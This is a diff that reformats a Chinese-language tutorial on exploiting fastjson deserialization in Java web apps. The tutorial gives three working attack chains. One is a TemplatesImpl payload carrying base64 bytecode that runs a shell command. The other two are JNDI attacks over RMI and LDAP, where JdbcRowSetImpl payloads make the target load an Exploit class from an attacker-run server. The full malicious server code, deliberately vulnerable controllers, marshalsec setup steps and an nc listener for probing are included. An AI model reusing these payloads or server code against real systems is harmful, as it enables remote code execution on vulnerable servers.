@@ -1,19 +1,17 @@
-Java fastjson
-0x00 fastjson漏洞简介
 
+## 0x00 fastjson漏洞简介
 1.parseObject函数导致反序列化执行命令原始利用@type特性构造函数User()或者setter()函数可控的条件下才能触发，如下表达式text可控,这个表达式在实战中应用很少。
-JSON.parseObject(text,Object.class);
+`JSON.parseObject(text,Object.class);`
 
 2.后来研究人员发现TemplatesImpl可利用完成攻击，利用条件比较苛刻.
 默认fastjson只会反序列化公开的属性和域而com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes却是私有属性，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化，也就是如下text1可控
-Object obj2 = JSON.parseObject(text1,Feature.SupportNonPublicField);
+`Object obj2 = JSON.parseObject(text1,Feature.SupportNonPublicField);`
 
-3.利用rmi、ldap实现攻击,可控代码JSON.parse(code)利用场景较多。
-
-0x01基于TemplatesImpl攻击演示
+3.利用rmi、ldap实现攻击,可控代码`JSON.parse(code)`利用场景较多。
+## 0x01基于TemplatesImpl攻击演示
 
 以下为漏洞代码基于spring mvc
-
+```java
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.JSONObject;
 import com.alibaba.fastjson.parser.Feature;
@@ -32,8 +30,9 @@ public class fastjsonController {
     }
 }
 }
+```
 Poc.java
-
+```java
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -59,13 +58,15 @@ public class poc extends AbstractTranslet {
     public static void main(String[] args) throws Exception {
         poc t = new poc();
     }
-先编译javac poc.java然后base64编码poc.class 发送payload
+```
 
+先编译`javac poc.java`然后base64编码poc.class 发送payload
+```bash
 code=%7B%22@type%22%3A%22com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl%22%2C%22_bytecodes%22%3A%5B%22yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ%2bAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAIcG9jLmphdmEMAAgACQcAIQwAIgAjAQAPdG91Y2ggL3RtcC94eG9vDAAkACUBAANwb2MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACgAEAAsADQAMAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEAABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFQAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGAAIABkADAAAAAQAAQAUAAEAFQAAAAIAFg%3D%3D%22%5D%2C%27_name%27%3A%27a.b%27%2C%27_tfactory%27%3A%7B%20%7D%2C%22_outputProperties%22%3A%7B%20%7D%2C%22_name%22%3A%22a%22%2C%22_version%22%3A%221.0%22%2C%22allowedProtocols%22%3A%22all%22%7D%22%3B
-0x02利用JNDI攻击掩饰
-
+```
+## 0x02利用JNDI攻击掩饰
 个人觉得这种方法比较好，可以过waf也方便检测漏洞但是对jdk版本有要求，测试了好久一直没有成功。后来发现jdk版本问题8u121以下版本就可以。8u121版本默认加了 trustURLCodebase限制了利用。本地开启JNDIserver监听1022，然后请求http://localhost:8888/ 加载运行Exploti.class文件
-
+```java
 package server;
 import com.sun.jndi.rmi.registry.ReferenceWrapper;
 import javax.naming.NamingException;
@@ -86,8 +87,9 @@ class JNDIServer {
         start();
     }
 }
-Exploit.java 代码如下，执行javac Exploit.java命令 编译成class文件 放在自己的web目录
-
+```
+Exploit.java 代码如下，执行`javac Exploit.java`命令 编译成class文件 放在自己的web目录
+```
 public class Exploit {
     public Exploit(){
         try{
@@ -100,8 +102,9 @@ public class Exploit {
         Exploit e = new Exploit();
     }
 
+```
 漏洞代码如下
-
+```java
 package com.fastjson.test;
 import com.alibaba.fastjson.JSON;
 import org.springframework.stereotype.Controller;
@@ -126,18 +129,21 @@ public class HelloController {
         return "home";
     }
 
+```
 发送
-
+```bash
 http://127.0.0.1:8080/fastjson?code=%7B%22@type%22%3A%22com.sun.rowset.JdbcRowSetImpl%22%2C%22dataSourceName%22%3A%22rmi%3A%2f%2f127.0.0.1%3A1022%2fExploit%22%2C%22autoCommit%22%3Atrue%7D
-利用工具marshalsec
+```
 
+利用工具marshalsec
+```
 git clone https://github.com/mbechler/marshalsec.git
 mvn clean package -DskipTests
-0x03 利用ldap攻击演示
-
+```
+## 0x03 利用ldap攻击演示
 目前不受jdk版本控制,套路和利用哦那个rmi相同
 ldapserver.java
-
+```java
 package server;
 
 import java.net.InetAddress;
@@ -244,15 +250,17 @@ public class LDAPServer{
 
     }
 }
+```
 本地搭建web 端口8888里面放编译好的文件名为Exploit.class文件。加载执行，漏洞利用代码跟rmi相同，payload如下
-
+```
 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1388/Exploit", "autoCommit":true}
 
 http://127.0.0.1:8080/fastjson?code=%7B%22@type%22%3A%22com.sun.rowset.JdbcRowSetImpl%22%2C%22dataSourceName%22%3A%22ldap%3A%2f%2f127.0.0.1%3A1388%2fExploit%22%2C%20%22autoCommit%22%3Atrue%7D%0A
-0x04 技巧
-
+```
+## 0x04 技巧
 1.通过提交错误的序列化字符串进行报错判断
 
+```
 Type Exception Report
 
 Message Request processing failed; nested exception is com.alibaba.fastjson.JSONException: set property error, outputProperties
@@ -260,20 +268,27 @@ Message Request processing failed; nested exception is com.alibaba.fastjson.JSON
 Description The server encountered an unexpected condition that prevented it from fulfilling the request.
 
 Exception
+```
+
 2.通过 rmi或者ldap判断漏洞是否存在
 
-{"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://127.0.0.1:1122/Object","autoCommit":true}
+`{"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://127.0.0.1:1122/Object","autoCommit":true}`
 本地监听
-
+```
 ➜  /tmp nc -l 1122
 JRMIK
-3.bp抓包查看时候有序列化数据，尝试payload
+```
 
+
+3.bp抓包查看时候有序列化数据，尝试payload
+```
 {"name":{"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://127.0.0.1:1122/Object","autoCommit":true},"age":12}
+```
 相关代码如下
+
 
 参考文章
 
 https://www.cnblogs.com/mrchang/p/6789060.html
-http://xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/
-http://xxlegend.com/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/
+http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/
+http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/
